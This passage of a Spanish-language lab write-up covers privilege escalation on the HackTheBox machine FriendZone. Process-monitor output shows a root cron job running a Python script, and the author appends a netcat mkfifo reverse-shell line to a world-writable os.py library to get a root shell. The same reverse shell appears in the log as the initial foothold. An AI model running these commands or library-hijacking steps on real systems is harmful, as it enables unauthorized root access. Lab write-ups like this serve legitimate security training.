2021/12/07 06:52:05 CMD: UID=0    PID=372    | /usr/lib/accountsservice/accounts-daemon 
2021/12/07 06:52:05 CMD: UID=0    PID=371    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
2021/12/07 06:52:05 CMD: UID=0    PID=369    | /usr/bin/VGAuthService 
2021/12/07 06:52:05 CMD: UID=103  PID=368    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-ac
tivation --syslog-only 
2021/12/07 06:52:05 CMD: UID=0    PID=360    | /usr/sbin/cron -f 
2021/12/07 06:52:05 CMD: UID=102  PID=359    | /usr/sbin/rsyslogd -n 
2021/12/07 06:52:05 CMD: UID=0    PID=358    | /lib/systemd/systemd-logind 
2021/12/07 06:52:05 CMD: UID=0    PID=35     | 
2021/12/07 06:52:05 CMD: UID=0    PID=34     | 
2021/12/07 06:52:05 CMD: UID=62583 PID=338    | /lib/systemd/systemd-timesyncd 
2021/12/07 06:52:05 CMD: UID=101  PID=335    | /lib/systemd/systemd-resolved 
2021/12/07 06:52:05 CMD: UID=0    PID=32     | 
2021/12/07 06:52:05 CMD: UID=0    PID=30     | 
2021/12/07 06:52:05 CMD: UID=0    PID=29     | 
2021/12/07 06:52:05 CMD: UID=0    PID=28     | 
2021/12/07 06:52:05 CMD: UID=0    PID=27     | 
2021/12/07 06:52:05 CMD: UID=100  PID=269    | /lib/systemd/systemd-networkd 
2021/12/07 06:52:05 CMD: UID=0    PID=264    | /lib/systemd/systemd-udevd 
2021/12/07 06:52:05 CMD: UID=0    PID=26     | 
2021/12/07 06:52:05 CMD: UID=0    PID=25     | 
2021/12/07 06:52:05 CMD: UID=0    PID=24     | 
2021/12/07 06:52:05 CMD: UID=0    PID=23     | 
2021/12/07 06:52:05 CMD: UID=0    PID=226    | /lib/systemd/systemd-journald 
2021/12/07 06:52:05 CMD: UID=0    PID=225    | /usr/bin/vmtoolsd 
2021/12/07 06:52:05 CMD: UID=0    PID=22     | 
2021/12/07 06:52:05 CMD: UID=33   PID=2176   | /bin/sh -i 
2021/12/07 06:52:05 CMD: UID=0    PID=21     | 
2021/12/07 06:52:05 CMD: UID=0    PID=20     | 
2021/12/07 06:52:05 CMD: UID=0    PID=2      | 
2021/12/07 06:52:05 CMD: UID=0    PID=197    | 
2021/12/07 06:52:05 CMD: UID=0    PID=196    | 
2021/12/07 06:52:05 CMD: UID=0    PID=19     | 
2021/12/07 06:52:05 CMD: UID=0    PID=18     | 
2021/12/07 06:52:05 CMD: UID=0    PID=175    | 
2021/12/07 06:52:05 CMD: UID=0    PID=174    | 
2021/12/07 06:52:05 CMD: UID=0    PID=173    | 
2021/12/07 06:52:05 CMD: UID=0    PID=171    | 
2021/12/07 06:52:05 CMD: UID=0    PID=170    | 
2021/12/07 06:52:05 CMD: UID=0    PID=17     | 
2021/12/07 06:52:05 CMD: UID=0    PID=169    | 
2021/12/07 06:52:05 CMD: UID=0    PID=16     | 
2021/12/07 06:52:05 CMD: UID=0    PID=15     | 
2021/12/07 06:52:05 CMD: UID=0    PID=14     | 
2021/12/07 06:52:05 CMD: UID=0    PID=13     | 
2021/12/07 06:52:05 CMD: UID=0    PID=1201   | 
2021/12/07 06:52:05 CMD: UID=0    PID=12     | 
2021/12/07 06:52:05 CMD: UID=0    PID=115    | 
2021/12/07 06:52:05 CMD: UID=1000 PID=11197  | bash 
2021/12/07 06:52:05 CMD: UID=1000 PID=11187  | (sd-pam) 
2021/12/07 06:52:05 CMD: UID=1000 PID=11186  | /lib/systemd/systemd --user 
2021/12/07 06:52:05 CMD: UID=33   PID=11185  | su friend 
2021/12/07 06:52:05 CMD: UID=0    PID=11180  | 
2021/12/07 06:52:05 CMD: UID=33   PID=11164  | bash 
2021/12/07 06:52:05 CMD: UID=33   PID=11163  | sh -c bash 
2021/12/07 06:52:05 CMD: UID=33   PID=11162  | script /dev/null -c bash 
2021/12/07 06:52:05 CMD: UID=33   PID=11158  | nc 10.10.14.27 443 
2021/12/07 06:52:05 CMD: UID=33   PID=11157  | /bin/sh -i 
2021/12/07 06:52:05 CMD: UID=33   PID=11156  | cat /tmp/f 
2021/12/07 06:52:05 CMD: UID=33   PID=11153  | sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.27 443 >/tmp/
f 
2021/12/07 06:52:05 CMD: UID=33   PID=11152  | /usr/sbin/apache2 -k start 
2021/12/07 06:52:05 CMD: UID=33   PID=11151  | /usr/sbin/apache2 -k start 
2021/12/07 06:52:05 CMD: UID=33   PID=11150  | /usr/sbin/apache2 -k start 
2021/12/07 06:52:05 CMD: UID=33   PID=11149  | /usr/sbin/apache2 -k start 
2021/12/07 06:52:05 CMD: UID=33   PID=11148  | /usr/sbin/apache2 -k start 
2021/12/07 06:52:05 CMD: UID=33   PID=11147  | /usr/sbin/apache2 -k start 
2021/12/07 06:52:05 CMD: UID=33   PID=11140  | /usr/sbin/apache2 -k start 
2021/12/07 06:52:05 CMD: UID=0    PID=11     | 
2021/12/07 06:52:05 CMD: UID=33   PID=10716  | 
2021/12/07 06:52:05 CMD: UID=33   PID=10715  | script /dev/null -c bash 
2021/12/07 06:52:05 CMD: UID=0    PID=10     | 
2021/12/07 06:52:05 CMD: UID=0    PID=1      | /sbin/init splash
2021/12/07 06:54:01 CMD: UID=0    PID=44095  | /usr/bin/python /opt/server_admin/reporter.py 
2021/12/07 06:54:01 CMD: UID=0    PID=44094  | /bin/sh -c /opt/server_admin/reporter.py 
2021/12/07 06:54:01 CMD: UID=0    PID=44093  | /usr/sbin/CRON -f 
2021/12/07 06:56:01 CMD: UID=0    PID=44098  | /usr/bin/python /opt/server_admin/reporter.py 
2021/12/07 06:56:01 CMD: UID=0    PID=44097  | /bin/sh -c /opt/server_admin/reporter.py 
2021/12/07 06:56:01 CMD: UID=0    PID=44096  | /usr/sbin/CRON -f 
```

Se observa que se ejecuta el programa en python `/opt/server_admin/reporter.py` y quien lo ejecuta es el usuario **root** (UID=0).

```bash
friend@FriendZone:/opt$ ls -l
total 4
drwxr-xr-x 2 root root 4096 Jan 24  2019 server_admin
friend@FriendZone:/opt$ cd server_admin
friend@FriendZone:/opt/server_admin$ ls -l
total 4
-rwxr--r-- 1 root root 424 Jan 16  2019 reporter.py
friend@FriendZone:/opt/server_admin$
```

Tenemos permisos de lectura dentro del directorio `server_admin` y sobre el recurso `reporter.py`; por lo que vamos a echarle un ojo:

```bash
friend@FriendZone:/opt/server_admin$ cat reporter.py 
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
friend@FriendZone:/opt/server_admin$
```

Del programa no vemos nada interesante, salvo que se importa la librería `os`, pero no tenemos permisos de escritura del programa ni bajo el directorio `server_admin`.

```bash
friend@FriendZone:/opt/server_admin$ python
Python 2.7.15rc1 (default, Apr 15 2018, 21:51:34) 
[GCC 7.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import sys
>>> sys.path
['', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages']
>>> exit()
friend@FriendZone:/opt/server_admin$
```

Por lo que no podemos hacer ***Library Hijacking*** creando un archivo llamado `os.py` dentro del directorio `server_admin`. Vemos que por default se utiliza python 2.7, así que vamos a echarle un ojo a la librería `os.py`:

```bash
friend@FriendZone:/opt/server_admin$ locate os.py
/usr/lib/python2.7/os.py
/usr/lib/python2.7/os.pyc
/usr/lib/python2.7/dist-packages/samba/provision/kerberos.py
/usr/lib/python2.7/dist-packages/samba/provision/kerberos.pyc
/usr/lib/python2.7/encodings/palmos.py
/usr/lib/python2.7/encodings/palmos.pyc
/usr/lib/python3/dist-packages/LanguageSelector/macros.py
/usr/lib/python3.6/os.py
/usr/lib/python3.6/encodings/palmos.py
friend@FriendZone:/opt/server_admin$ ls -l /usr/lib/python2.7/os.py
-rwxrwxrwx 1 root root 25910 Jan 15  2019 /usr/lib/python2.7/os.py
friend@FriendZone:/opt/server_admin$
```

Tenemos permisos de escritura del recurso `/usr/lib/python2.7/os.py`, asi que podemos ejecutar comandos como el usuario **root**; para este caso, vamos a entablarnos una reverse shell. Al final del archivo `os.py` agregamos la siguiente linea:

```python
system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.27 443 >/tmp/f")
```

Nos ponemos en escucha por el puerto 443 y esperamos a que el usuario **root** ejecute el programa:

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.123] 42142
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# 
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).
